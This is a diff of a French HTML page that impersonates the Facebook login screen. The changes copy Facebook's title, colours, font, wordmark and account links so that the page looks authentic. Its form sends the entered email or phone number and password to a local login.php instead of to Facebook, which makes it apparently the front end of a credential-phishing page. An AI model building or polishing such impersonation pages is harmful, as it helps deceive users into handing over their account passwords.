@@ -2,47 +2,108 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Connexion à Facebook</title>
+  <title>Facebook – Connectez-vous ou inscrivez-vous</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #e9ebee;
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #f0f2f5;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
+      min-height: 100vh;
     }
-    .box {
-      background: white;
-      padding: 20px;
-      box-shadow: 0 0 10px gray;
+
+    .logo {
+      font-size: 48px;
+      color: #1877f2;
+      font-weight: bold;
+      margin-bottom: 20px;
+    }
+
+    .container {
+      background-color: white;
+      padding: 20px 16px;
+      width: 360px;
       border-radius: 8px;
-      width: 300px;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
     }
-    input {
+
+    .container form input {
       width: 100%;
-      padding: 10px;
-      margin: 8px 0;
+      padding: 14px 12px;
+      margin: 10px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
     }
-    button {
+
+    .container form button {
       width: 100%;
-      padding: 10px;
-      background: #1877f2;
-      color: white;
+      padding: 14px;
+      background-color: #1877f2;
       border: none;
+      border-radius: 6px;
+      color: white;
+      font-size: 17px;
       font-weight: bold;
       cursor: pointer;
+    }
+
+    .container .link {
+      text-align: center;
+      margin: 15px 0;
+    }
+
+    .container .link a {
+      color: #1877f2;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .divider {
+      height: 1px;
+      background-color: #dadde1;
+      margin: 20px 0;
+    }
+
+    .create-btn {
+      background-color: #42b72a;
+      color: white;
+      padding: 14px;
+      width: 60%;
+      margin: 0 auto;
+      display: block;
+      border-radius: 6px;
+      text-align: center;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 15px;
+      text-decoration: none;
+    }
+
+    @media (max-width: 400px) {
+      .container {
+        width: 90%;
+      }
     }
   </style>
 </head>
 <body>
-  <div class="box">
-    <h2>Connexion à Facebook</h2>
+  <div class="logo">facebook</div>
+  <div class="container">
     <form action="login.php" method="POST">
-      <input type="text" name="email" placeholder="Adresse e-mail ou téléphone" required>
+      <input type="text" name="email" placeholder="Adresse e-mail ou numéro de mobile" required>
       <input type="password" name="pass" placeholder="Mot de passe" required>
       <button type="submit">Se connecter</button>
+      <div class="link">
+        <a href="#">Mot de passe oublié ?</a>
+      </div>
+      <div class="divider"></div>
+      <a href="#" class="create-btn">Créer nouveau compte</a>
     </form>
   </div>
 </body>
